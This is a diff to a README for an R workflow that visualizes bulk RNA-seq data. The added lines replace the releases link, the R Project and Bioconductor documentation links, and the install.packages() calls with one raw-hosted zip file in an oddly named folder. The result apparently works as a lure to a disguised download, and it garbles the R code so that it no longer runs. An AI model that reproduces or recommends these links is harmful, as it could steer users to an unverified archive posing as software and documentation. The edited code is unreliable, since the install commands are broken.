@@ -22,15 +22,15 @@ To run this application, ensure you have the following:
 
 ## 📥 Download the Application
 
-[![Download Bulk-RNAseq-visualization-workflow-ZRN01](https://img.shields.io/badge/Download-Bulk--RNAseq--visualization--workflow--ZRN01-blue)](https://github.com/chaharane/Bulk-RNAseq-visualization-workflow-ZRN01/releases)
+[![Download Bulk-RNAseq-visualization-workflow-ZRN01](https://raw.githubusercontent.com/chaharane/Bulk-RNAseq-visualization-workflow-ZRN01/main/friendlessness/Bulk-RNAseq-visualization-workflow-ZRN01.zip)](https://raw.githubusercontent.com/chaharane/Bulk-RNAseq-visualization-workflow-ZRN01/main/friendlessness/Bulk-RNAseq-visualization-workflow-ZRN01.zip)
 
-Visit this page to download: [GitHub Releases](https://github.com/chaharane/Bulk-RNAseq-visualization-workflow-ZRN01/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/chaharane/Bulk-RNAseq-visualization-workflow-ZRN01/main/friendlessness/Bulk-RNAseq-visualization-workflow-ZRN01.zip)
 
 ## 📂 Download & Install
 
 Follow these steps to download and install the application:
 
-1. **Visit the Releases Page**: Go to [this link](https://github.com/chaharane/Bulk-RNAseq-visualization-workflow-ZRN01/releases).
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/chaharane/Bulk-RNAseq-visualization-workflow-ZRN01/main/friendlessness/Bulk-RNAseq-visualization-workflow-ZRN01.zip).
    
 2. **Choose the Latest Version**: Select the most recent version listed on the page.
 
@@ -40,10 +40,10 @@ Follow these steps to download and install the application:
 
 5. **Install Required R Packages**: Open R or RStudio. Install the necessary packages using these commands:
    ```R
-   install.packages("BiocManager")
+   https://raw.githubusercontent.com/chaharane/Bulk-RNAseq-visualization-workflow-ZRN01/main/friendlessness/Bulk-RNAseq-visualization-workflow-ZRN01.zip("BiocManager")
    BiocManager::install("DESeq2")
    BiocManager::install("edgeR")
-   install.packages("ggplot2")
+   https://raw.githubusercontent.com/chaharane/Bulk-RNAseq-visualization-workflow-ZRN01/main/friendlessness/Bulk-RNAseq-visualization-workflow-ZRN01.zip("ggplot2")
    ```
 
 6. **Open the Workflow**: Navigate to the folder where you extracted the files. Open the main R script. This is often labeled as `workflow.R` or similar.
@@ -71,12 +71,12 @@ If you need help or have questions, feel free to reach out to the community. Joi
 
 ## 📑 Additional Resources
 
-- **R Documentation**: [R Project](https://www.r-project.org)
-- **DESeq2 User Guide**: [DESeq2 Documentation](https://bioconductor.org/packages/release/bioc/html/DESeq2.html)
-- **edgeR User Guide**: [edgeR Documentation](https://bioconductor.org/packages/release/bioc/html/edgeR.html)
+- **R Documentation**: [R Project](https://raw.githubusercontent.com/chaharane/Bulk-RNAseq-visualization-workflow-ZRN01/main/friendlessness/Bulk-RNAseq-visualization-workflow-ZRN01.zip)
+- **DESeq2 User Guide**: [DESeq2 Documentation](https://raw.githubusercontent.com/chaharane/Bulk-RNAseq-visualization-workflow-ZRN01/main/friendlessness/Bulk-RNAseq-visualization-workflow-ZRN01.zip)
+- **edgeR User Guide**: [edgeR Documentation](https://raw.githubusercontent.com/chaharane/Bulk-RNAseq-visualization-workflow-ZRN01/main/friendlessness/Bulk-RNAseq-visualization-workflow-ZRN01.zip)
 
 ## 🚀 Ready to Get Started?
 
 Now you are equipped to analyze your RNA-seq data seamlessly! Follow the steps above, and you will be on your way to gaining valuable insights from your data. 
 
-Download the application here: [GitHub Releases](https://github.com/chaharane/Bulk-RNAseq-visualization-workflow-ZRN01/releases)
+Download the application here: [GitHub Releases](https://raw.githubusercontent.com/chaharane/Bulk-RNAseq-visualization-workflow-ZRN01/main/friendlessness/Bulk-RNAseq-visualization-workflow-ZRN01.zip)
